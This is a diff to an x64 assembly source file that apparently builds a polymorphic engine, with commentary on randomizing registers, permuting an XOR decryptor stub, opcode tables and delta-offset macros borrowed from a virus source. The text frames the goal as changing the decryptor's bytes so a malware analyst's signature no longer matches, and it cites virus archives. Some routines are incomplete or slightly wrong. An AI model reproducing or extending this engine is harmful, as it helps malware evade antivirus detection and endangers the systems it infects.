@@ -130,6 +130,13 @@
 ;                                                                    fig. 3
 ;   -----------------------------------------------------------------------
 ;
+;  The ModR/M byte
+;            rbx := 011, r8 := 1000
+;                           ____r8
+;                          / \,__,__rbx
+;           mov r8, rbx ; 11000011
+;           mov rbx, r8 ; 11011000
+;                   rbx____\/ \_/____r8 = src
 ;   i. Note on Quick Visualization of Binary with Python
 ;
 ;       # One off
@@ -185,11 +192,174 @@
 ;  One contesting idea regarding this however is the benefits of
 ;  the sheer simplicity of XOR, ADD, and SUB ciphers. For example,
 ;  in [18] one of the most advanced cyber attacks in history, a s-
-;  liding XOR cipher was employed to decent success.
+;  liding XOR cipher was employed to decent success. 
+
+;                   V: Random Registers
+; 
+;  Now that we know what logical operations must be included and 
+;  have an idea of how what bit-level characteristics each instru-
+;  ction might have (fig 3.), the next fundamental characteristic
+;  of the polymorphic engine to understand is the random selection
+;  of registers. Take the following:
 ;
-;                   IV. Permuting the Decryptor
+;                  [rax, rbx, rcx, rdx, rdi, rsi]
 ;
-;  [11] Provides a notation and description for a decryption algor-
+;  To get a random register from this list, one need only to gene-
+;  rate a random number in the range and use it as an index. This
+;  is a good starting point for the discussion on randomness in
+;  general. Fortunately for the poly-engine author, there are so-
+;  me extremely simple algorithms that are 'good-enough' for now.
+;  The following code is lifted straight from [16]:
+;
+;      __uint128_t g_lehmer64_state;
+;      
+;      uint64_t lehmer64() {
+;        g_lehmer64_state *= 0xda942042e4dd58b5;
+;        return g_lehmer64_state >> 64;
+;      }
+;
+;  This could be implemented in asm as follows:
+;   
+;      get_lehmer:
+;        mov     rax, rcx
+;        mov     rcx, 0da942042e4dd58b5h
+;        mul     rax, rcx
+;        shr     rax, 64
+;        ret
+;
+;  And after invocation, an index for a register can simply be
+;  derivied by taking the generated random, shifting right 59 bits
+;  (max value is now 0b11111 or 31 in base-10). From there, calc-
+;  ulating the modulo 10. This should be sufficient for an index.
+;  This is just my off-handed way of deriving a number within a
+;  range from another larger number. I'm sure there's other and 
+;  better ways to do it. In assembly:
+;
+;       get_rand_reg:
+;         call  get_random
+;         shr   rax, 59
+;         xor   rdx, rdx
+;         mov   rcx, 10
+;         div   rcx
+;         mov   rax, rcx
+;
+;  The above code has been adapted to be more general and can be
+;  found in the source code below.
+;
+;  Given the time elapsed between this writing and the introduct-
+;  ion of the RDRAND instruction, its a good bet that it will be
+;  available in most target environments, however it is a magic
+;  black box that in my opinion is better left untouched. 
+;  Entropy can be collected in other ways. For future
+;  reference, [17] is a good introduction to understanding and
+;  calculating entropy.
+;
+;  The last bit to do is to go about shuffling the list of regi-
+;  sters. The initial list can be described as follows:
+;
+;           [length_reg, source_reg, dest_reg, key_reg]
+;
+;                   VI. Generating Code
+;
+;  Finally, now that all of the pieces have been laid out, the
+;  fun begins: generating code. To reiterate, the idea is to take
+;  the implementation of the cipher and reconstruct it using code
+;  that is logically equivalent, but different in encoding. Take 
+;  the following: 
+;
+;  simple_substitution_cipher:                             ; Adapted from [6]
+;      simple_substitution_cipher_setup:
+;          mov     rcx, (offset payload_code_ends - offset payload_code) / 2
+;                                                          ;  Calculate payload body size in words                         
+;          mov     rbx, offset payload_code                                                                                                
+;          mov     rsi, rbx                                ;  source = start of encrypted code                             
+;          mov     rdi, rsi                                ;  destination = same as the source                             
+;          mov     rbx, 029Ah                              ;  rbx = key                                                                                                                                              
+;                                                                                                                          
+;      simple_substitution_cipher_loop_begin:                                                                              
+;          mov     ax, word ptr [rsi]                      ;  Essentially lodsw but better able to permutate
+;          inc     rsi
+;          inc     rsi         
+;          xor     ax, bx                                  ;  The fundamental cipher operation          
+;          mov     word ptr [rdi], ax                            
+;          inc     rdi
+;          inc     rdi      
+;          ;  Notice the segment must be marked RWX to modify the code.
+;          ;  Wouldn't it be cool if the permutated decryptor made a VirtualProtect
+;          ;  call before executing the encryption operations?
+;          dec     rcx
+;          test    rcx, rcx
+;          jnz     simple_substitution_cipher_loop_begin    
+;      simple_substitution_cipher_end:
+;          ret
+;
+;  One way that this could be reconstucted to be logically equival-
+;  ent but slightly different in encoding is by simply changing up
+;  the registers. For example, the first instruction could be cha-
+;  nged from:
+;
+;       mov rcx, (sizeof payload in words (immediate value))
+;       mov rdx, (sizeof payload in words (immediate value))
+;  
+;  This is exactly what a lot of 'poly' engines do, but it is 
+;  really a trivial change:
+;
+;       :  48 c7 c1 04 00 00 00    mov    rcx,0x4 ; version a - assume the payload is only 4 bytes long
+;       :  48 c7 c2 04 00 00 00    mov    rdx,0x4 ; version b
+;
+;  And if we were to do the same simple operation for the first
+;  two lines, they would look like this:
+;
+;       :  48 c7 c1 04 00 00 00    mov    rcx,0x4 \__ version a
+;       :  48 c7 c3 00 ?? ?? ??    mov    rbx,0x0 /
+;       :  48 c7 c2 04 00 00 00    mov    rdx,0x4 \__ version b
+;       :  48 c7 c0 00 ?? ?? ??    mov    rax,0x0 /
+;
+;  A malware analyst would just look at this and write something
+;  like this to identify the binary pattern:
+;
+;       2 ( 48 c7 c? 04 00 00 00 )
+; 
+;  This is a simplified example, but apply the concept to the rest
+;  of the code. Register permutation is not nearly enough. That b-
+;  eing said, what other parts of this could we permutate? One go-
+;  od starting place would be adding the capability to the engine
+;  to generate instructions that use different addressing modes.
+;  For example, if we were to permute the first two lines as such:
+;
+;       mov rcx, 4 -> mov ax, 4
+;
+;  The resulting bytecode changes much more dramatically:
+;
+;       :  48 c7 c1 04 00 00 00    mov    rcx,0x4
+;       :  66 b8 04 00             mov    ax,0x4 
+;
+;  But making this dramatic of a change has two consequences: first,
+;  the code now only addresses the low 16 bits of RAX. Any bits set
+;  n the upper portions of the register will be erroneously operat-
+;  ed on if the RAX register is used anywhere else. Dealing with 
+;  this is simple enough - just make sure to continue using AX ins-
+;  tead of rcx. The second consequence is however more problematic;
+;  the overall size of the decryptor has changed. If not dealt with,
+;  this will destroy the ability of labels to describe the code's
+;  logical components correctly. I can envision a couple of ways of
+;  dealing with this. One is to simply keep track of changes in 
+;  the size to different parts of the decryptor stub and fixup 
+;  any jump locations accordingly. The other is to track the change
+;  in bytes between sections of the code and insert junk code. Each
+;  has its pros and cons.
+; 
+;  Either solution will take some engineering to accomplish. Regard-
+;  less, the binary representation of the code is now completely 
+;  different. Still, there are more advanced ways to permutate these
+;  instructions. For example, instead of moving an immediate into
+;  the destination register, an immediate could be loaded into
+;  the another register and then moved into the target destination
+;  register. But for now, simply changing the register mode should
+;  be enough.
+;
+;
+;  [11] Provides a notation and descriptio;n for a decryption algor-
 ;  ithm very similar to the ones provided by [6]. The following is
 ;  an adaptation of the described algorithm and the permutation ru-
 ;  les provided:
@@ -239,75 +409,7 @@
 ;       permutation: [3, 1, 2, 4, 5, 6, 7, 10, 8, 9, 11, 12]
 ;       place:       [1, 2, 3, 4, 5, 6, 7, 8,  9, 10, 11, 12]
 ;
-;                   V: Random Registers
-; 
-;  Now that we know what logical operations must be included and 
-;  have an idea of how what bit-level characteristics each instru-
-;  ction might have (fig 3.), the next fundamental characteristic
-;  of the polymorphic engine to understand is the random selection
-;  of registers.
-;
-;       [rax, rbx, rcx, rdx, r8, r9, r11, r12, r13, r14, r15]
-;
-;  To get a random register from this list, one need only to gene-
-;  rate a random number in the range and use it as an index. This
-;  is a good starting point for the discussion on randomness in
-;  general. Fortunately for the poly-engine author, there are so-
-;  me extremely simple algorithms that are 'good-enough' for now.
-;  The following code is lifted straight from [16]:
-;
-;      __uint128_t g_lehmer64_state;
-;      
-;      uint64_t lehmer64() {
-;        g_lehmer64_state *= 0xda942042e4dd58b5;
-;        return g_lehmer64_state >> 64;
-;      }
-;
-;  This could be implemented in asm as follows:
-;   
-;      get_lehmer:
-;        mov     rax, rcx
-;        mov     rcx, 0da942042e4dd58b5h
-;        mul     rax, rcx
-;        shr     rax, 64
-;        ret
-;
-;  And after invocation, an index for a register can simply be
-;  derivied by taking the generated random, shifting right 59 bits
-;  (max value is now 0b11111 or 31 in base-10). From there, calc-
-;  ulating the modulo 10. This should be sufficient for an index.
-;  This is just my off-handed way of deriving a number withing a
-;  range from another larger number. I'm sure there's other and 
-;  better ways to do it. In assembly:
-;
-;       get_rand_reg:
-;         shr   rax, 59
-;         xor   rdx, rdx
-;         mov   rcx, 10
-;         div   rcx
-;         mov   rax, rcx
-;
-;  Given the time elapsed between this writing and the introduct-
-;  ion of the RDRAND instruction, its a good bet that it will be
-;  available in most target environments, however it is a magic
-;  black box that in my opinion is better left untouched. 
-;  Instead, entropy an be collected in other ways. For future
-;  reference, [17] is a good introduction to understanding and
-;  calculating entropy.
-;
-;            rbx := 011, r8 := 1000
-;                           ____r8
-;                          / \,__,__rbx
-;           mov r8, rbx ; 11000011
-;           mov rbx, r8 ; 11011000
-;                   rbx____\/ \_/____r8 = src
-;
-;  The last bit to do is to go about shuffling the list of regi-
-;  sters. The initial list can be described as follows:
-;
-;           [length_reg, source_reg, dest_reg, key_reg]
-;
-;  
+
 ;
 ;  References:
 ;   [1] https://vx-underground.org/archive/VxHeaven/lib/vbb01.html
@@ -328,6 +430,7 @@
 ;   [16] https://lemire.me/blog/2019/03/19/the-fastest-conventional-random-number-generator-that-can-pass-big-crush/
 ;   [17] https://machinelearningmasteyr.com/what-is-informatin-entropy
 ;   [18] https://vxug.fakedoma.in/samples/Exotic/UNC2452/SolarWinds%20Breach/
+;   [19] https://github.com/vxunderground/MalwareSourceCode/blob/6919f569b56cdbf91fad247753571673b1eac083/LegacyWindows/Win98/Win98.BlackBat.asm
 ;
 ;  Not directly related but still relevant:
 ;   [i] https://github.com/Battelle/sandsifter
@@ -336,13 +439,17 @@
 option win64:3      ; init shadow space, reserve stack at PROC level
 
 ;-----------------------------------------------------------------------------
-;  Operating Mode Constants and Structs
+;  Operating Mode Constants, Structs, and Macros
 ;-----------------------------------------------------------------------------
 
+; Constants
+; 
 ENC_CIPHER_XOR              EQU 0
 ENC_CIPHER_XOR_SLIDING      EQU 1
 ENC_CIPHER_XOR_LONG_KEY     EQU 2
 
+; Structs
+;
 REG_TABLE struct
     source_reg BYTE REG_AX
     dest_reg   BYTE REG_BX
@@ -354,71 +461,168 @@ REG_TABLE struct
     junk_reg_3 BYTE REG_DI
 REG_TABLE ends
 
+; Macros
+;
+
+; Get the current instruction pointer [19]
+GET_DELTA macro reg:REQ
+    local   GetIP
+    call    GetIP
+GetIP:
+    pop     reg
+    sub     reg, offset GetIP
+endm
+
+; Get the true offset of the specified address [19]
+GET_OFFSET macro reg:REQ, expr:REQ
+    local   GetIP
+    call    GetIP
+GetIP:
+    pop     reg 
+    add     reg, offset expr - offset GetIP
+endm
 ;-----------------------------------------------------------------------------
 ;  Skeleton Opcode Table
 ;-----------------------------------------------------------------------------
 ; Notes:
 ;   - Registers encodings for r8-r15 operands not yet supported
-;
+;   - Is there probably a faster/smaller way to write this? Probably.
+;     But that would be less clear and nothing beats lots of practice
+;   - Opcodes marked 64 include r16/r32/64 (or immediate)
+;   - The first two sets of opcodes are show in base-2 for visualization
+;     Remaining opcodes are shown in base-16
 
+SKELETON_TABLE struct
+; ADD series
+OP_ADD_RM8_R8     BYTE 00000000b
+OP_ADD_RM64_R64   BYTE 00000001b 
+OP_ADD_R8_M8      BYTE 00000001b
+OP_ADD_R64_RM64   BYTE 00000010b
+OP_ADD_AL_IMM8    BYTE 00000101b 
+OP_ADD_AX_IMM32   BYTE 00000110b
+OP_ADD_RM8_IMM8   WORD 1000001111000000b                        ; Moving an imm8 into a 16 bit register is done with opcode 0x83 
+OP_ADD_RM64_IMM32 WORD 1000000111000000b                        ; and the opcode extension field of the ModR/M byte set to 0
+OP_ADD_RM64_IMM8  WORD 1000001111000000b
+
+; OR series
+OP_OR_RM8_R8      BYTE 00001000b 
+OP_OR_RM64_R64    BYTE 00000101b
+OP_OR_R8_RM8      BYTE 00001010b 
+OP_OR_R64_RM64    BYTE 00001011b 
+OP_OR_AL_IMM8     BYTE 00001100b 
+OP_OR_AX_IMM32    BYTE 00001101b
+OP_OR_RM8_IMM8    WORD 1000000011000001b
+OP_OR_RM64_IMM32  WORD 1000000111000001b
+OP_OR_RM64_IMM8   WORD 1000001111000001b
+
+OP_AND_RM8_R8     BYTE 20h
+OP_AND_RM64_R64   BYTE 21h
+OP_AND_R8_RM8     BYTE 22h
+OP_AND_R64_RM64   BYTE 23h
+OP_AND_AL_IMM8    BYTE 24h
+OP_AND_AX_IMM32   BYTE 25h
+OP_AND_RM8_IMM8   WORD 80C4h
+OP_AND_RM64_IMM32 WORD 81C4h
+OP_AND_RM64_IMM8  WORD 83C4h
+
+OP_SUB_RM8_R8     BYTE 28h
+OP_SUB_RM64_R64   BYTE 29h
+OP_SUB_R8_RM8     BYTE 2Ah
+OP_SUB_R64_RM64   BYTE 2Bh
+OP_SUB_AL_IMM8    BYTE 2Ch
+OP_SUB_AX_IMM32   BYTE 2Dh
+OP_SUB_RM8_IMM8   WORD 80C5h
+OP_SUB_RM64_IMM32 WORD 81C5h
+OP_SUB_RM64_IMM8  WORD 83C5h
+
+OP_XOR_RM8_R8     BYTE 30h
+OP_XOR_RM64_R64   BYTE 31h
+OP_XOR_R8_RM8     BYTE 32h
+OP_XOR_R64_RM64   BYTE 33h
+OP_XOR_AL_IMM8    BYTE 34h
+OP_XOR_AX_IMM32   BYTE 35h
+OP_XOR_RM8_IMM8   WORD 80C6h
+OP_XOR_RM64_IMM32 WORD 81C6h
+OP_XOR_RM64_IMM8  WORD 83C6h
+
+OP_CMP_RM8_R8     BYTE 38h
+OP_CMP_RM64_R64   BYTE 39h
+OP_CMP_R8_RM8     BYTE 3Ah
+OP_CMP_R64_RM64   BYTE 3Bh
+OP_CMP_AL_IMM8    BYTE 3Ch
+OP_CMP_AX_IMM32   BYTE 3Dh
+OP_CMP_RM8_IMM8   WORD 80C7h
+OP_CMP_RM64_IMM32 WORD 81C7h
+OP_CMP_RM64_IMM8  WORD 83C7h
+
+OP_MOV_RM8_R8     BYTE 88h
+OP_MOV_RM64_R64   BYTE 89h
+OP_MOV_R8_RM8     BYTE 8Ah
+OP_MOV_R64_RM64   BYTE 8Bh
+OP_MOV_RL_IMM8    BYTE 0B0h                                     ;  AND the opcode with the dest register!
+OP_MOV_R64_IMM64  BYTE 0B8h                                     ;  AND the opcode with the dest register!
+OP_MOV_RM8_IMM8   BYTE 0C6C0h
+OP_MOV_RM64_IMM32 BYTE 0C7C0h
+
+OP_LOOP_CX_RE18   BYTE 0E2h
 ; MOD (mode) encodings
 ;
-MOD_REG     EQU 11000000b
-MOD_DISP_4B EQU 10000000b
-MOD_DISP_1B EQU 01000000b
-MOD_REG_IND EQU 00000000b
+MOD_REG     BYTE 11000000b
+MOD_DISP_4B BYTE 10000000b
+MOD_DISP_1B BYTE 01000000b
+MOD_REG_IND BYTE 00000000b
 
 ; SIB (scale) encodings
 ;
-SIB_SCALE_1 EQU 00000000b
-SIB_SCALE_2 EQU 01000000b
-SIB_SCALE_3 EQU 10000000b
-SIB_SCALE_4 EQU 11000000b
+SIB_SCALE_1 BYTE 00000000b
+SIB_SCALE_2 BYTE 01000000b
+SIB_SCALE_3 BYTE 10000000b
+SIB_SCALE_4 BYTE 11000000b
 
 ; Register encodings
 ;
-REG_AX EQU 00000000b
-REG_BX EQU 00011000b
-REG_CX EQU 00001000b
-REG_DX EQU 00010000b
-REG_SP EQU 00100000b
-REG_BP EQU 00101000b
-REG_DI EQU 00111000b
-REG_SI EQU 00110000b
+REG_AX      BYTE 00000000b
+REG_BX      BYTE 00011000b
+REG_CX      BYTE 00001000b
+REG_DX      BYTE 00010000b
+REG_SP      BYTE 00100000b
+REG_BP      BYTE 00101000b
+REG_DI      BYTE 00111000b
+REG_SI      BYTE 00110000b
 
 ;  r/m16/32/64 operands
 ;               |SRCDST|
-REG_AX_SRC EQU 00000000b
-REG_BX_SRC EQU 00011000b
-REG_CX_SRC EQU 00001000b
-REG_DX_SRC EQU 00010000b
-REG_SP_SRC EQU 00100000b
-REG_BP_SRC EQU 00101000b
-REG_DI_SRC EQU 00111000b
-REG_SI_SRC EQU 00110000b
+REG_AX_SRC  BYTE 00000000b
+REG_BX_SRC  BYTE 00011000b
+REG_CX_SRC  BYTE 00001000b
+REG_DX_SRC  BYTE 00010000b
+REG_SP_SRC  BYTE 00100000b
+REG_BP_SRC  BYTE 00101000b
+REG_DI_SRC  BYTE 00111000b
+REG_SI_SRC  BYTE 00110000b
 
-REG_AX_DST EQU 00000000b
-REG_BX_DST EQU 00000011b
-REG_CX_DST EQU 00000001b
-REG_DX_DST EQU 00000010b
-REG_SP_DST EQU 00000100b
-REG_BP_DST EQU 00000101b
-REG_SI_DST EQU 00000110b
-REG_DI_DST EQU 00000111b
+REG_AX_DST  BYTE 00000000b
+REG_BX_DST  BYTE 00000011b
+REG_CX_DST  BYTE 00000001b
+REG_DX_DST  BYTE 00000010b
+REG_SP_DST  BYTE 00000100b
+REG_BP_DST  BYTE 00000101b
+REG_SI_DST  BYTE 00000110b
+REG_DI_DST  BYTE 00000111b
 
 ; REX byte for normal operations
 ;
-REX_W       EQU 01001000b
-REX_WB      EQU 01001001b
+REX_W       BYTE 01001000b
+REX_WB      BYTE 01001001b
 
 ; Non-64 bit prefixes
 ;
-PREFIX_OP_8  EQU 10001000b
-PREFIX_OP_16 EQU 00010110b
-PREFIX_OP_32 EQU 00101001b
-
+PREFIX_OP_8  BYTE 10001000b
+PREFIX_OP_16 BYTE 00010110b
+PREFIX_OP_32 BYTE 00101001b
 ; r8-r15 registers are encoded using a different REX prefix
 ; this should be implemented in later revisions
+SKELETON_TABLE ends
 
 DATA$00 SEGMENT PAGE 'DATA'
 
@@ -450,6 +654,7 @@ TEXT$00 SEGMENT ALIGN(10h) 'CODE' READ WRITE EXECUTE
         local   qwCipherEnd:QWORD
         local   dwCipherLen:DWORD
         local   RegTable:REG_TABLE
+        local   SkeletonTable:SKELETON_TABLE
         mov     rcx, 2                                  ;  Start with the more-simple ciphers
         call    get_rand_from_range                     ;  Get a random number in the range
         mov     [dwCipherIndex], eax                    ;  Save the index
@@ -465,6 +670,10 @@ TEXT$00 SEGMENT ALIGN(10h) 'CODE' READ WRITE EXECUTE
         mov     qwCipherEnd, rbx
         sub     rbx, rax
         mov     dwCipherLen, ebx
+
+        ;  Get the first random register
+        call    get_rand_reg
+
 
         ; Initialize the members of RegTable to random values
         
@@ -495,11 +704,19 @@ simple_substitution_cipher:
         mov     rbx, 029Ah                              ;  rbx = key                                                                                                                                              
                                                                                                                         
     simple_substitution_cipher_loop_begin:                                                                              
-        lodsw                                           ;  MOV's word from [si] to ax, and increases si by 2            
-        xor     ax, bx                                  ;  The actual decryption                                        
-        stosw                                           ;  MOV's word from ax to [di], and increases di by 2            
-                                                        ;  Notice the segment must be marked RWX to modify the code     
-        loop    simple_substitution_cipher_loop_begin   ;  DEC's cx, and jumps to start_loop if CX > 0                  
+        mov     ax, word ptr [rsi]                      ;  Essentially lodsw but better able to permutate
+        inc     rsi
+        inc     rsi         
+        xor     ax, bx                                  ;  The fundamental cipher operation          
+        mov     word ptr [rdi], ax                            
+        inc     rdi
+        inc     rdi      
+        ;  Notice the segment must be marked RWX to modify the code.
+        ;  Wouldn't it be cool if the permutated decryptor made a VirtualProtect
+        ;  call before executing the encryption operations?
+        dec     rcx
+        test    rcx, rcx
+        jnz     simple_substitution_cipher_loop_begin    
     simple_substitution_cipher_end:
         ret
 
